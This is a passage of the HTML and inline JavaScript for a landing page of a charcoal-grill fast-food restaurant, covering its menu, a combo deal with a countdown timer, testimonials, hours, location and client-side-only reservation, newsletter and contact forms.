      <p class="lead">No heat lamps, no shortcuts. Everything at STOKED is cooked to order over real charcoal — burgers, wings, and loaded fries in under 12 minutes.</p>
      <div class="hero-ctas">
        <a class="btn btn-solid" href="#menu">See the Menu</a>
        <a class="btn btn-outline" href="#reservation">Book a Table</a>
      </div>
      <div class="stat-strip">
        <div><b>12<span style="font-size:16px;">min</span></b><span>avg. fire-to-table</span></div>
        <div><b>40+</b><span>menu items</span></div>
        <div><b>4.8<span style="font-size:16px;">/5</span></b><span>2,300+ reviews</span></div>
        <div><b>3</b><span>city locations</span></div>
      </div>
    </div>
    <div class="hero-art">
      <div class="hero-photo">
        <img src="https://images.unsplash.com/photo-1568901346375-23c9450c58cd?auto=format&fit=crop&w=900&q=80" alt="Flame-grilled burger stacked high">
      </div>
      <div class="ticket">
        <div class="fire">★ CHEF'S PICK</div>
        <div class="big">Smoke Stack Burger</div>
        <div class="tiny">Double patty · smoked cheddar · char sauce</div>
      </div>
    </div>
  </div>
</section>

<div class="marquee-wrap">
  <div class="marquee">
    <span>SMASH BURGERS <em>★</em> CHAR-GRILLED WINGS <em>★</em> LOADED FRIES <em>★</em> SMOKY BBQ RIBS <em>★</em> ASH-ROASTED CORN <em>★</em></span>
    <span>SMASH BURGERS <em>★</em> CHAR-GRILLED WINGS <em>★</em> LOADED FRIES <em>★</em> SMOKY BBQ RIBS <em>★</em> ASH-ROASTED CORN <em>★</em></span>
  </div>
</div>

<!-- CATEGORIES -->
<section id="categories">
  <div class="wrap">
    <div class="head reveal">
      <div class="eyebrow">What We Fire Up</div>
      <h2>Pick Your Craving</h2>
      <p>Six stations, one open flame. Everything's made fresh the second you order.</p>
    </div>
    <div class="cat-grid">
      <div class="cat-card reveal"><div class="icon">🍔</div><h4>Burgers</h4><span>12 items</span></div>
      <div class="cat-card reveal"><div class="icon">🍗</div><h4>Wings & Tenders</h4><span>9 items</span></div>
      <div class="cat-card reveal"><div class="icon">🍟</div><h4>Loaded Fries</h4><span>7 items</span></div>
      <div class="cat-card reveal"><div class="icon">🌯</div><h4>Wraps</h4><span>6 items</span></div>
      <div class="cat-card reveal"><div class="icon">🍦</div><h4>Sweet Stuff</h4><span>8 items</span></div>
    </div>
  </div>
</section>

<div class="grate"></div>

<!-- ABOUT -->
<section class="about" id="about">
  <div class="wrap">
    <div class="about-photos reveal">
      <img class="p1" src="https://images.unsplash.com/photo-1544025162-d76694265947?auto=format&fit=crop&w=700&q=80" alt="Chef grilling over open charcoal flame">
      <img class="p2" src="https://images.unsplash.com/photo-1550547660-d9450f859349?auto=format&fit=crop&w=500&q=80" alt="Close up of char-grilled chicken wings">
    </div>
    <div class="about-copy reveal">
      <div class="eyebrow">Our Story</div>
      <h2>Started in a Parking Lot. Never Slowed Down.</h2>
      <p style="color:var(--smoke);margin-top:16px;max-width:480px;">STOKED began as a single charcoal drum grill outside a garage in 2014. Ten years later we're still cooking the same way — over real fire, with zero shortcuts — just with a lot more grills.</p>
      <ul class="about-list">
        <li><span class="num">01</span><div><h4>Real Charcoal, Every Order</h4><p>No flat-tops, no microwaves — every item touches open flame.</p></div></li>
        <li><span class="num">02</span><div><h4>Sourced Daily</h4><p>Meat and produce delivered fresh each morning, never frozen.</p></div></li>
        <li><span class="num">03</span><div><h4>Built for Speed</h4><p>Fire-to-table in under 12 minutes without cutting corners.</p></div></li>
      </ul>
      <a class="btn btn-solid" href="#menu" style="margin-top:30px;">Full Menu</a>
    </div>
  </div>
</section>

<!-- MENU -->
<section id="menu">
  <div class="wrap">
    <div class="head reveal">
      <div class="eyebrow">What's Cooking</div>
      <h2>The Menu</h2>
      <p>Every dish rated by heat — from mild char to full flame.</p>
    </div>
    <div class="tabs" id="tabs">
      <button class="tab active" data-filter="all">All</button>
      <button class="tab" data-filter="burgers">Burgers</button>
      <button class="tab" data-filter="wings">Wings</button>
      <button class="tab" data-filter="fries">Fries</button>
      <button class="tab" data-filter="sweet">Sweet</button>
    </div>
    <div class="menu-grid" id="menuGrid">

      <div class="dish" data-cat="burgers">
        <div class="photo">
          <span class="badge">Chef's Pick</span>
          <img src="https://images.unsplash.com/photo-1568901346375-23c9450c58cd?auto=format&fit=crop&w=500&q=80" alt="Smoke stack double cheeseburger">
        </div>
        <div class="body">
          <div class="cat">Burgers</div>
          <h4>Smoke Stack Burger</h4>
          <p>Double smashed patty, smoked cheddar, char sauce, pickled onion.</p>
          <div class="foot">
            <div class="price"><s>$15.50</s>$12.90</div>
            <div class="flames"><span class="on">🔥</span><span class="on">🔥</span><span>🔥</span></div>
          </div>
        </div>
      </div>

      <div class="dish" data-cat="wings">
        <div class="photo">
          <span class="badge">Hottest</span>
          <img src="https://images.unsplash.com/photo-1527477396000-e27163b481c2?auto=format&fit=crop&w=500&q=80" alt="Char-grilled hot wings">
        </div>
        <div class="body">
          <div class="cat">Wings</div>
          <h4>Ghost Ember Wings</h4>
          <p>Charcoal-grilled wings tossed in ghost pepper glaze, ranch on the side.</p>
          <div class="foot">
            <div class="price">$13.90</div>
            <div class="flames"><span class="on">🔥</span><span class="on">🔥</span><span class="on">🔥</span></div>
          </div>
        </div>
      </div>

      <div class="dish" data-cat="fries">
        <div class="photo">
          <span class="badge">New</span>
          <img src="https://images.unsplash.com/photo-1573080496219-bb080dd4f877?auto=format&fit=crop&w=500&q=80" alt="Loaded fries with cheese and bacon">
        </div>
        <div class="body">
          <div class="cat">Loaded Fries</div>
          <h4>Ash & Bacon Fries</h4>
          <p>Hand-cut fries, smoked cheese sauce, bacon crumble, scallion.</p>
          <div class="foot">
            <div class="price">$9.50</div>
            <div class="flames"><span class="on">🔥</span><span>🔥</span><span>🔥</span></div>
          </div>
        </div>
      </div>

      <div class="dish" data-cat="burgers">
        <div class="photo">
          <img src="https://images.unsplash.com/photo-1553979459-d2229ba7433b?auto=format&fit=crop&w=500&q=80" alt="Spicy grilled chicken burger">
        </div>
        <div class="body">
          <div class="cat">Burgers</div>
          <h4>Firecracker Chicken</h4>
          <p>Grilled chicken thigh, chili mayo, slaw, brioche bun.</p>
          <div class="foot">
            <div class="price">$11.90</div>
            <div class="flames"><span class="on">🔥</span><span class="on">🔥</span><span>🔥</span></div>
          </div>
        </div>
      </div>

      <div class="dish" data-cat="wings">
        <div class="photo">
          <img src="https://images.unsplash.com/photo-1608039755401-742074f0548d?auto=format&fit=crop&w=500&q=80" alt="Honey glazed grilled wings">
        </div>
        <div class="body">
          <div class="cat">Wings</div>
          <h4>Honey Char Wings</h4>
          <p>Slow-grilled wings glazed in charred honey and smoked salt.</p>
          <div class="foot">
            <div class="price">$12.50</div>
            <div class="flames"><span class="on">🔥</span><span>🔥</span><span>🔥</span></div>
          </div>
        </div>
      </div>

      <div class="dish" data-cat="sweet">
        <div class="photo">
          <span class="badge">New</span>
          <img src="https://images.unsplash.com/photo-1579954115545-a95591f28bfc?auto=format&fit=crop&w=500&q=80" alt="Chocolate lava cake dessert">
        </div>
        <div class="body">
          <div class="cat">Sweet Stuff</div>
          <h4>Torched Lava Cake</h4>
          <p>Warm chocolate cake, torched marshmallow, vanilla soft-serve.</p>
          <div class="foot">
            <div class="price">$7.90</div>
            <div class="flames"><span>🔥</span><span>🔥</span><span>🔥</span></div>
          </div>
        </div>
      </div>

    </div>
    <div class="menu-more reveal"><a class="btn btn-outline" href="#">View Full Menu</a></div>
  </div>
</section>

<!-- DEAL -->
<section class="deal">
  <div class="wrap">
    <div>
      <div class="eyebrow">Weekday Special</div>
      <h2>Grab the Combo,<br>Save 25%</h2>
      <p>Smoke Stack Burger + Ash Fries + Fountain Drink. Weekdays only, while the coals last.</p>
      <div class="countdown mono" id="countdown">
        <div><b id="cdH">08</b><span>HRS</span></div>
        <div><b id="cdM">42</b><span>MIN</span></div>
        <div><b id="cdS">17</b><span>SEC</span></div>
      </div>
      <div style="display:flex;align-items:center;gap:24px;flex-wrap:wrap;">
        <div class="deal-price"><span class="old">$18.90</span><span class="new">$14.20</span></div>
        <a class="btn" style="background:var(--char);color:var(--cream);" href="#menu">Grab the Deal</a>
      </div>
    </div>
    <div class="deal-photo">
      <img src="https://images.unsplash.com/photo-1571091718767-18b5b1457add?auto=format&fit=crop&w=700&q=80" alt="Combo meal with burger and fries">
    </div>
  </div>
</section>

<div class="band">
  <div class="wrap mono">
    <div><b>10,000+</b><span>Orders / Month</span></div>
    <div><b>4.8/5</b><span>Average Rating</span></div>
    <div><b>3</b><span>Locations</span></div>
    <div><b>12 min</b><span>Fire-to-Table</span></div>
    <div><b>10yrs</b><span>Grilling</span></div>
  </div>
</div>

<!-- TESTIMONIALS -->
<section id="reviews">
  <div class="wrap">
    <div class="head reveal">
      <div class="eyebrow">Word on the Street</div>
      <h2>What People Say</h2>
    </div>
    <div class="test-grid">
      <div class="test-card reveal">
        <div class="quote">"</div>
        <p>The Smoke Stack Burger genuinely changed how I think about fast food. Char on the patty, no soggy bun — order arrived in 10 minutes flat.</p>
        <div class="who">
          <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=100&q=80" alt="Portrait of customer Dana Reyes">
          <div><b>Dana Reyes</b><span>Regular Customer</span></div>
        </div>
      </div>
      <div class="test-card reveal">
        <div class="quote">"</div>
        <p>Ghost Ember Wings live up to the name. Real smoke flavor, proper heat, and the ranch actually cuts it. My weekly order now.</p>
        <div class="who">
          <img src="https://images.unsplash.com/photo-1560250097-0b93528c311a?auto=format&fit=crop&w=100&q=80" alt="Portrait of customer Miles Okafor">
          <div><b>Miles Okafor</b><span>Food Blogger</span></div>
        </div>
      </div>
      <div class="test-card reveal">
        <div class="quote">"</div>
        <p>Catered a 40-person office lunch and everything showed up hot, on time, and perfectly packed. The Ash & Bacon Fries were the first thing gone.</p>
        <div class="who">
          <img src="https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=100&q=80" alt="Portrait of customer Priya Anand">
          <div><b>Priya Anand</b><span>Corporate Client</span></div>
        </div>
      </div>
    </div>
  </div>
</section>

<div class="grate"></div>

<!-- HOURS / LOCATION -->
<section class="split">
  <div class="wrap">
    <div class="col">
      <div class="eyebrow">Open For You</div>
      <h2 style="font-size:30px;margin-bottom:26px;">Hours</h2>
      <div class="hours-row"><span>Mon — Tue</span><span>Closed</span></div>
      <div class="hours-row"><span>Wed — Thu</span><span>11:00 AM – 9:00 PM</span></div>
      <div class="hours-row"><span>Fri</span><span>11:00 AM – 11:00 PM</span></div>
      <div class="hours-row"><span>Sat</span><span>12:00 PM – 11:30 PM</span></div>
      <div class="hours-row"><span>Sun</span><span>12:00 PM – 8:00 PM</span></div>
    </div>
    <div class="col">
      <div class="eyebrow">Find Us</div>
      <h2 style="font-size:30px;margin-bottom:26px;">Flagship Location</h2>
      <div class="loc-row"><div class="ic">📍</div><div><b>Address</b><span>118 Ember Row, Brooklyn, NY 11211</span></div></div>
      <div class="loc-row"><div class="ic">📞</div><div><b>Phone</b><span>+1 (800) 555-0134</span></div></div>
      <div class="loc-row"><div class="ic">✉️</div><div><b>Email</b><span>hello@stoked.food</span></div></div>
      <a class="btn btn-solid" href="#menu">Order Delivery</a>
    </div>
  </div>
</section>

<!-- RESERVATION -->
<section class="reserve" id="reservation">
  <div class="wrap">
    <div class="reveal">
      <div class="eyebrow">Book a Table</div>
      <h2>Reserve Your Spot</h2>
      <p style="color:var(--smoke);margin-top:16px;max-width:380px;">Weekend evenings fill fast — book at least a day ahead and we'll have your table ready by the grill.</p>
      <ul class="contact-info" style="margin-top:34px;">
        <li><div class="ic" style="width:40px;height:40px;border-radius:50%;background:rgba(255,90,31,.12);color:var(--ember);display:flex;align-items:center;justify-content:center;flex-shrink:0;">👥</div><div><b>Group Dining</b><br><span style="color:var(--smoke);font-size:14px;">Custom menus for parties of 10+</span></div></li>
      </ul>
    </div>
    <div class="form-card reveal">
      <form id="reserveForm">
        <div class="form-grid">
          <div class="field"><label>Full Name</label><input type="text" required placeholder="Your name"></div>
          <div class="field"><label>Phone</label><input type="tel" required placeholder="(800) 555-0134"></div>
          <div class="field"><label>Guests</label>
            <select><option>1 Person</option><option>2 People</option><option>3–4 People</option><option>5–6 People</option><option>7+ People</option></select>
          </div>
          <div class="field"><label>Date</label><input type="date" required></div>
          <div class="field"><label>Time</label>
            <select><option>6:00 PM</option><option>7:00 PM</option><option>8:00 PM</option><option>9:00 PM</option></select>
          </div>
          <div class="field"><label>Email</label><input type="email" required placeholder="you@email.com"></div>
        </div>
        <div class="field"><label>Special Requests</label><textarea rows="3" placeholder="Allergies, celebrations, seating preference..."></textarea></div>
        <button type="submit" class="btn btn-solid" style="width:100%;justify-content:center;">Confirm Reservation</button>
        <div class="form-msg" id="reserveMsg">Table requested — we'll confirm by email shortly.</div>
      </form>
    </div>
  </div>
</section>

<!-- NEWSLETTER -->
<section class="newsletter">
  <div class="wrap">
    <div class="eyebrow" style="justify-content:center;">Stay Stoked</div>
    <h2>Get 15% Off Your First Order</h2>
    <p>Drop your email for weekly specials, new menu drops, and first access to limited items.</p>
    <form class="sub-form" id="subForm">
      <input type="email" required placeholder="you@email.com">
      <button class="btn btn-solid" type="submit">Subscribe</button>
    </form>
    <div class="form-msg" id="subMsg" style="text-align:center;">You're on the list — check your inbox for your code.</div>
  </div>
</section>

<!-- CONTACT -->
<section class="contact" id="contact">
  <div class="wrap">
    <div class="reveal">
      <div class="eyebrow">Get In Touch</div>
      <h2>Questions, Catering,<br>Feedback</h2>
      <p style="color:var(--smoke);margin:16px 0 30px;max-width:380px;">We typically reply within two hours during service.</p>
      <ul class="contact-info">
        <li><div class="ic" style="width:40px;height:40px;border-radius:50%;background:rgba(255,90,31,.12);color:var(--ember);display:flex;align-items:center;justify-content:center;flex-shrink:0;">📍</div><div><b>Address</b><br><span style="color:var(--smoke);font-size:14px;">118 Ember Row, Brooklyn, NY 11211</span></div></li>
        <li><div class="ic" style="width:40px;height:40px;border-radius:50%;background:rgba(255,90,31,.12);color:var(--ember);display:flex;align-items:center;justify-content:center;flex-shrink:0;">📞</div><div><b>Phone</b><br><span style="color:var(--smoke);font-size:14px;">+1 (800) 555-0134</span></div></li>
        <li><div class="ic" style="width:40px;height:40px;border-radius:50%;background:rgba(255,90,31,.12);color:var(--ember);display:flex;align-items:center;justify-content:center;flex-shrink:0;">✉️</div><div><b>Email</b><br><span style="color:var(--smoke);font-size:14px;">hello@stoked.food</span></div></li>
      </ul>
    </div>
    <div class="form-card reveal">
      <form id="contactForm">
        <div class="form-grid">
          <div class="field"><label>Name</label><input type="text" required placeholder="Your name"></div>
          <div class="field"><label>Email</label><input type="email" required placeholder="you@email.com"></div>
        </div>
        <div class="field"><label>Subject</label>
          <select><option>General Inquiry</option><option>Catering & Events</option><option>Feedback</option><option>Partnership</option></select>
        </div>
        <div class="field"><label>Message</label><textarea rows="4" required placeholder="How can we help?"></textarea></div>
        <button type="submit" class="btn btn-solid" style="width:100%;justify-content:center;">Send Message</button>
        <div class="form-msg" id="contactMsg">Message sent — we'll reply within 2 hours.</div>
      </form>
    </div>
  </div>
</section>

<footer>
  <div class="wrap">
    <div class="foot-grid">
      <div>
        <div class="logo" style="margin-bottom:16px;">STOKED<span class="flame-dot">.</span></div>
        <p style="color:var(--smoke);font-size:14px;max-width:280px;">Flame-grilled fast food, cooked over real charcoal since 2014. Fast, loud, never phoned in.</p>
        <div class="socials" style="margin-top:20px;">
          <a href="#" aria-label="Instagram">IG</a>
          <a href="#" aria-label="Twitter / X">X</a>
          <a href="#" aria-label="TikTok">TT</a>
          <a href="#" aria-label="Facebook">FB</a>
        </div>
      </div>
      <div>
        <h5>Quick Links</h5>
        <ul>
          <li><a href="#hero">Home</a></li>
          <li><a href="#about">Our Story</a></li>
          <li><a href="#menu">Menu</a></li>
          <li><a href="#reservation">Reservation</a></li>
        </ul>
      </div>
      <div>
        <h5>Menu</h5>
        <ul>
          <li><a href="#menu">Burgers</a></li>
          <li><a href="#menu">Wings</a></li>
          <li><a href="#menu">Loaded Fries</a></li>
          <li><a href="#menu">Sweet Stuff</a></li>
        </ul>
      </div>
      <div>
        <h5>Contact</h5>
        <ul>
          <li>118 Ember Row, Brooklyn, NY 11211</li>
          <li>+1 (800) 555-0134</li>
          <li>hello@stoked.food</li>
          <li>Wed – Sun: 11 AM – 11 PM</li>
        </ul>
      </div>
    </div>
    <div class="foot-bottom">
      <span>© 2026 STOKED. All rights reserved.</span>
      <span>Privacy · Terms · Cookies</span>
    </div>
  </div>
</footer>

<script>
  // mobile nav
  const burgerBtn = document.getElementById('burgerBtn');
  const navLinks = document.getElementById('navLinks');
  burgerBtn.addEventListener('click', () => navLinks.classList.toggle('open'));
  navLinks.querySelectorAll('a').forEach(a => a.addEventListener('click', () => navLinks.classList.remove('open')));

  // menu filter
  const tabs = document.querySelectorAll('.tab');
  const dishes = document.querySelectorAll('.dish');
  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      const f = tab.dataset.filter;
      dishes.forEach(d => {
        d.style.display = (f === 'all' || d.dataset.cat === f) ? '' : 'none';
      });
    });
  });

  // countdown timer
  let total = 8*3600 + 42*60 + 17;
  const cdH = document.getElementById('cdH'), cdM = document.getElementById('cdM'), cdS = document.getElementById('cdS');
  setInterval(() => {
    if (total <= 0) { total = 8*3600 + 42*60 + 17; }
    total--;
    const h = Math.floor(total/3600), m = Math.floor((total%3600)/60), s = total%60;
    cdH.textContent = String(h).padStart(2,'0');
    cdM.textContent = String(m).padStart(2,'0');
    cdS.textContent = String(s).padStart(2,'0');
  }, 1000);

  // form submissions (client-side only)
  function handleForm(formId, msgId){
    const form = document.getElementById(formId);
    const msg = document.getElementById(msgId);
    form.addEventListener('submit', e => {
      e.preventDefault();
      msg.classList.add('show');
      form.reset();
      setTimeout(() => msg.classList.remove('show'), 5000);
    });
  }
  handleForm('reserveForm','reserveMsg');
  handleForm('contactForm','contactMsg');
  handleForm('subForm','subMsg');

  // scroll reveal
  const revealEls = document.querySelectorAll('.reveal');
  const io = new IntersectionObserver(entries => {
    entries.forEach(en => { if(en.isIntersecting){ en.target.classList.add('in'); io.unobserve(en.target);} });
  }, {threshold:0.15});
  revealEls.forEach(el => io.observe(el));
</script>
</body>
</html>
